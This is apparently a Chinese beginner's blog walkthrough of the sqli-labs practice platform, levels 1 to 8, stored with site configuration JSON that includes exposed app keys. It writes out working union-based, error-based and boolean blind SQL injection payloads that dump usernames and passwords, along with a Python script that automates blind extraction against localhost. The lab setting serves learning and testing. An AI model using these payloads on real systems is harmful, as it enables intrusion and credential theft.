1,group_concat(username),group_concat(password) <span class=\"hljs-keyword\">from</span><span class=\"hljs-built_in\"> users </span>-- +</code></pre></p>\n<p><img src=\"/img/2018-07-20/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>第一关就算是过了</p>\n<h5 id=\"less-2\"><a href=\"#less-2\" class=\"headerlink\" title=\"less-2\"></a>less-2</h5><p>第二关和第一关如出一辙，只不过id后面的内容没有引号引起来，php代码对比如下<br><pre><code class=\"hljs undefined\">SELECT * <span class=\"hljs-keyword\">FROM</span><span class=\"hljs-built_in\"> users </span>WHERE <span class=\"hljs-attribute\">id</span>=<span class=\"hljs-string\">'$id'</span> LIMIT 0,1\n<span class=\"hljs-comment\">#第一关</span>\nSELECT * <span class=\"hljs-keyword\">FROM</span><span class=\"hljs-built_in\"> users </span>WHERE <span class=\"hljs-attribute\">id</span>=<span class=\"hljs-variable\">$id</span> LIMIT 0,1\n第二关</code></pre></p>\n<p>所以我们把paylaod的<code>id-1</code>后面的单引号去掉就好了甚至注释符都不用<br>payload如下<br><pre><code class=\"hljs undefined\">id=-1 union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">database</span>()\n<span class=\"hljs-keyword\">id</span>=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(table_name) <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">where</span> table_schema = <span class=\"hljs-string\">'security'</span>\n<span class=\"hljs-keyword\">id</span>=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">group_concat</span>(column_name) <span class=\"hljs-keyword\">from</span> information_schema.columns <span class=\"hljs-keyword\">where</span> table_name = <span class=\"hljs-string\">'users'</span>\n<span class=\"hljs-keyword\">id</span>=<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-keyword\">group_concat</span>(username),<span class=\"hljs-keyword\">group_concat</span>(<span class=\"hljs-keyword\">password</span>) <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">users</span></code></pre></p>\n<p>第二关完</p>\n<h5 id=\"less-3\"><a href=\"#less-3\" class=\"headerlink\" title=\"less-3\"></a>less-3</h5><p>第三关<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">SELECT</span> * <span class=\"hljs-keyword\">FROM</span> <span class=\"hljs-keyword\">users</span> <span class=\"hljs-keyword\">WHERE</span> <span class=\"hljs-keyword\">id</span>=(<span class=\"hljs-string\">'$id'</span>) <span class=\"hljs-keyword\">LIMIT</span> <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span></code></pre></p>\n<p>多了括号，直接上payload吧<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>') union select <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,database() -- +</code></pre></p>\n<p>就不多列了</p>\n<h5 id=\"less-4\"><a href=\"#less-4\" class=\"headerlink\" title=\"less-4\"></a>less-4</h5><p>第四关<br>这次有点不同，当我们测试<code>id=1&#39;</code>时返回页面是正常的，测试<code>id=1&quot;</code>报错<br><img src=\"/img/2018-07-20/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>根据报错信息来看，查询语句大概如下<br><pre><code class=\"hljs undefined\">SELECT * <span class=\"hljs-keyword\">FROM</span><span class=\"hljs-built_in\"> users </span>WHERE id=(<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$id</span>\"</span>) LIMIT 0,1</code></pre></p>\n<p>看一眼index.php，差不多<br><img src=\"/img/2018-07-20/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>还是那个payload，换汤不换药<br><pre><code class=\"hljs undefined\">id=-1\") union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-keyword\">database</span>() <span class=\"hljs-comment\">-- +</span></code></pre></p>\n<h5 id=\"less-5\"><a href=\"#less-5\" class=\"headerlink\" title=\"less-5\"></a>less-5</h5><p>第五关开始提高难度<br>首先从大纲里看到第五关是双注入（double injection）,单引号（single quote）<br><img src=\"/img/2018-07-20/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"><br>这个注入我也好久才理解，就不做了，直接分析<br><img src=\"/img/2018-07-20/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>首先，sql查询正确会返回<code>You are in...........</code>，错误会返回sql的错误，也就是说我们输入正确的查询语句不会返回结果，所以我们要提交错误的查询语句，或者说会报错的语句比较合适，先介绍一些函数<code>count()</code>，<code>rand()</code>,<code>floor()</code>,<code>concat_ws</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-function\"><span class=\"hljs-title\">count</span><span class=\"hljs-params\">()</span></span>         计算总数\n<span class=\"hljs-function\"><span class=\"hljs-title\">rand</span><span class=\"hljs-params\">()</span></span>    \t \t生成<span class=\"hljs-number\">0</span>~<span class=\"hljs-number\">1</span>的随机数\n<span class=\"hljs-function\"><span class=\"hljs-title\">floor</span><span class=\"hljs-params\">()</span></span>    \t\t向下取整\n<span class=\"hljs-function\"><span class=\"hljs-title\">concat_ws</span><span class=\"hljs-params\">()</span></span> \t拼接查询结果</code></pre></p>\n<p>最后一个可能不好理解，用例子说明下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select concat_ws(':',username,password) from users;\n+----------------------------------+</span>\n<span class=\"hljs-section\">| concat_ws(':',username,password) |\n+----------------------------------+</span>\n| Dumb:Dumb                        |\n| admin:admin                      |\n| admin1:admin1                    |\n| admin2:admin2                    |\n| admin3:admin3                    |\n| dhakkan:dumbo                    |\n<span class=\"hljs-section\">| admin4:admin4                    |\n+----------------------------------+</span>\n7 rows in set (0.00 sec)</code></pre></p>\n<p>1<br>rand()<em>2生成0~2的随机数，floor(rand()</em>2)产生0或1<br>2<br>以<code>select database()</code>为例子<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()\n<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>))\n<span class=\"hljs-keyword\">select</span> conut(*),<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">as</span> a <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> a</code></pre></p>\n<p><img src=\"/img/2018-07-20/16.png\" srcset=\"/img/static/loading.gif\" alt=\"16\"><br>数据库名<code>security</code>已经出来了<br>关于原因<br><b><code>concat_ws(&#39;:&#39;,select database(),floor(rand()*2))</code>会产生一大堆<code>security:0</code>，<code>security:1</code>的查询结果，重点在<code>group by</code>，在排序时，排序的结果在临时表里，在插入前会先计算一遍要插入结果的内容，假如是<code>security:0</code>，如果此时临时表只有<code>security:1</code>的行不存在<code>security:0</code>的行，那么数据库要将该条记录插入临时表，由于后面的0和1是随机数，在插入时又要计算一次，那么此时的结果可能已经不再是<code>security:0</code>而变成了<code>security:1</code>了，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</b><br>后面的基本差不多，就不列了，有人可能把这道题当做盲注来做<del>一开始我也是这么想的</del></p>\n<h5 id=\"less-6\"><a href=\"#less-6\" class=\"headerlink\" title=\"less-6\"></a>less-6</h5><p><b>双引号的双注入</b>&gt;，把less-5的单引号变成双引号，换汤不换药</p>\n<h5 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less-7\"></a>less-7</h5><p><b>导入文件注入</b>，这个需要知道网站在系统中的具体位置，（网站管理员怎么可能给你知道。。）也比较难，网上也有写的狠详细的过程–&gt;<a href=\"https://www.cnblogs.com/lcamry/p/5763105.html\" target=\"_blank\" rel=\"noopener\">传送门</a>,就直接下一关吧</p>\n<h5 id=\"less-8\"><a href=\"#less-8\" class=\"headerlink\" title=\"less-8\"></a>less-8</h5><p>Blind Boolian Based（布尔盲注），这里又涉及到一个盲注的概念，上面的可以直接返回结果是直接注入拿到数据库表单及列等数据，盲注就是，查询结果正确页面返回正常，查询错误页面返回错误，不会带出数据<br>举很简单的例子,<code>1=1</code>正确<br><img src=\"/img/2018-07-20/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"><br><code>1=2</code>错误<br><img src=\"/img/2018-07-20/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>然后注入方法就是不断的查询，通常盲注都要写脚本，先介绍一些函数，<code>ascii()</code>,这个函数式把字母变成ascii码值，<code>substr()</code>这个函数式切割字符串，假设<code>a=test</code>,<code>substr(a,1,1)=t</code>,<code>substr(a,2,1)=e</code>,以此类推，查数据库payload<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>' and ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)) &gt;= '<span class=\"hljs-number\">97</span></code></pre></p>\n<p><code>substr</code>取<code>database()</code>的第一个字符，ascii把它变化才能ascii码值，然后做对比，比较它的ascii码值是否大于等于97，即’a’<br><img src=\"/img/2018-07-20/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"><br>返回正确，然后一直判断下去，遍历所有字母，一个个去试肯定比较麻烦，所以首选写脚本，其次也不能一个个遍历，可以用二分法，可以节省很多时间，python自动跑数据库名脚本如下<br><pre><code class=\"hljs python\">import requests\ntxt1 = \"http://localhost/sqli-labs/Less-8/?id=1' and ascii(substr(database(),\"\ntxt2 = \",1)) &gt;= '\"\ntxt3 = \",1)) = '\"\npayload1 = 1 \npayload2 = 97\ntxt4 = 'You are in..........'\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9)://长度\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\t//reqtext是获取页面上的内容是不是等于txt4\n\tif(reqtext == txt4):\n\t\tnum1 = 1\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[570:590]\n\tif(reqtext == txt4):\n\t\tnum3 = 1\n//判断范围，数字48-57，大写65-90，小写97-122\n//字母切三次，判断三次，部分四次，abc def ghi jklm nop qrs tuv wxyz\n//数字切一次，判断五次，01234 56789\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[570:590]\n\t\tif(reqtext == txt4):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[570:590]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0</code></pre></p>\n<p>结果如下<br><img src=\"/img/2018-07-20/20.png\" srcset=\"/img/static/loading.gif\" alt=\"20\"><br>查表查列修改代码url部分即可,给出前面部分，长度需要自己调整，手工判断下就可以了，没有必要写脚本<br><pre><code class=\"hljs undefined\">import requests\ntxt1 = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 2,1),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1))) &gt;= '\"</span>\ntxt3 = <span class=\"hljs-string\">\",1))) = '\"</span></code></pre></p>\n<p>妈呀写博客比学的还累。。。</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>&emsp;&emsp;偶然发现<code>sqli-labs</code>这个练习平台（本地），这个平台有很多案例可以提供给同学学习，很适合初学者入门。写篇博客<del>装个逼</del>记录下学习过程（假装我是大佬）<br>","more":"</p>\n<h4 id=\"下载安装\"><a href=\"#下载安装\" class=\"headerlink\" title=\"下载安装\"></a>下载安装</h4><ul>\n<li>首先附上github的下载地址–&gt;<a href=\"https://github.com/Audi-1/sqli-labs\" target=\"_blank\" rel=\"noopener\">传送门</a></li>\n<li>下载<code>phpstudy</code>，phpstudy的站点目录是这个<code>PHPTutorial\\WWW</code>，把刚刚下载的平台解压放到里面</li>\n<li>如果我没记错的话，phpstudy的mysql初始密码是root，在<code>sql-connections\\db-creds.inc</code>写上你的mysql数据库密码<br><img src=\"/img/2018-07-20/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>上述步骤做完后就可以启动phpstudy，然后打开火狐浏览器（记得安装hackbar插件），访问<code>localhost/sqli-labs-master/</code>看待下面的页面就算安装好了<br>点击<code>Setup/reset Database for labs</code>建立数据库<br><img src=\"/img/2018-07-20/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"></li>\n</ul>\n<h4 id=\"开始学习\"><a href=\"#开始学习\" class=\"headerlink\" title=\"开始学习\"></a>开始学习</h4><h5 id=\"less-1\"><a href=\"#less-1\" class=\"headerlink\" title=\"less-1\"></a>less-1</h5><p>第一关是最简单的一关了，直接<code>id=1&#39;</code>就报错了<br><img src=\"/img/2018-07-20/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>再测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code><br><img src=\"/img/2018-07-20/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>返回正常，不难想象我们想数据库递交<code>id=1</code>的语句为<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">tables</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-keyword\">id</span> = <span class=\"hljs-string\">'1'</span></code></pre></p>\n<p>递交<code>id=1&#39; and &#39;1&#39;=&#39;1</code>的语句为<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-keyword\">tables</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-keyword\">id</span> = <span class=\"hljs-string\">'1'</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-string\">'1'</span>=<span class=\"hljs-string\">'1'</span></code></pre></p>\n<p>接下来测试<code>id=1&#39; union select database() -- +</code>，<code>-- +</code>是注释符<br><img src=\"/img/2018-07-20/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>发现报错了，错误上说了，列的数量对不上，修改为<code>id=1&#39; union select 1,2,database() -- +</code>,页面返回正常但没有返回我们所希望的数据库名称<br>这个是因为index.php中<code>mysql_fetch_array</code>函数只调用了一个<br><img src=\"/img/2018-07-20/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br><code>mysql_fetch_array</code>函数的作用是从结果集中取得一行作为关联数组或数字数组或二者兼有，可以在终端下试一下，这里就不演示了，下面是我们提交sql查询语句在终端下的结果<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select * from users where id = '1' union select 1,2,database();\n+----+----------+----------+</span>\n<span class=\"hljs-section\">| id | username | password |\n+----+----------+----------+</span>\n|  1 | Dumb     | Dumb     |\n<span class=\"hljs-section\">|  1 | 2        | security |\n+----+----------+----------+</span>\n2 rows in set (0.00 sec)</code></pre></p>\n<p>上面查询结果可以看到返回了两个结果，但是<code>mysql_fetch_array</code>只取一行，也就是说要让查询出来的结果放在第一行，这里就用最简单快捷的一种,把id的1改为-1，-1查询不到，因此结果就是我们想要的<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select * from users where id = '-1' union select 1,2,database();\n+----+----------+----------+</span>\n<span class=\"hljs-section\">| id | username | password |\n+----+----------+----------+</span>\n<span class=\"hljs-section\">|  1 | 2        | security |\n+----+----------+----------+</span>\n1 row in set (0.00 sec)</code></pre></p>\n<p>最终的payload为<code>id=-1&#39; union select 1,2,database() -- +</code><br><img src=\"/img/2018-07-20/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>由于这篇文章是面向初学者写的，可能会比较啰嗦，mysql数据库初始时有四个数据库，如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; show databases;\n+--------------------+</span>\n<span class=\"hljs-section\">| Database           |\n+--------------------+</span>\n| information<span class=\"hljs-emphasis\">_schema |\n| mysql              |\n| performance_</span>schema |\n<span class=\"hljs-section\">| test               |\n+--------------------+</span>\n4 rows in set (0.01 sec)</code></pre></p>\n<p>其中，<code>information_schema</code>这个数据库中存着所有数据库的名字及表单列名，详细的细节这里不列出来有不懂的兴趣的可以去了解一下–&gt;<a href=\"https://www.jianshu.com/p/ea15158f39f7\" target=\"_blank\" rel=\"noopener\">传送门</a>，我们也是要先在这个数据库里找到当前数据库的表单和列名才可以把某个表的数据列出来<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select table_name from information_schema.tables where table_schema = 'security';\n+------------+</span>\n<span class=\"hljs-section\">| table_name |\n+------------+</span>\n| emails     |\n| referers   |\n| uagents    |\n<span class=\"hljs-section\">| users      |\n+------------+</span>\n4 rows in set (0.00 sec)</code></pre></p>\n<p>这里可以偷个懒，我们可以不找数据库名直接让<code>table_schema=database()</code>就可以省了一步<br><pre><code class=\"hljs undefined\"><span class=\"hljs-section\">mysql&gt; select table_name from information_schema.tables where table_schema = database();\n+------------+</span>\n<span class=\"hljs-section\">| table_name |\n+------------+</span>\n| emails     |\n| referers   |\n| uagents    |\n<span class=\"hljs-section\">| users      |\n+------------+</span>\n4 rows in set (0.00 sec)</code></pre></p>\n<p>所以我们的payload为<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,table_name <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-built_in\">tables</span> <span class=\"hljs-built_in\">where</span> table_schema = 'security' -- +</code></pre></p>\n<p><img src=\"/img/2018-07-20/8.png\" srcset=\"/img/static/loading.gif\" 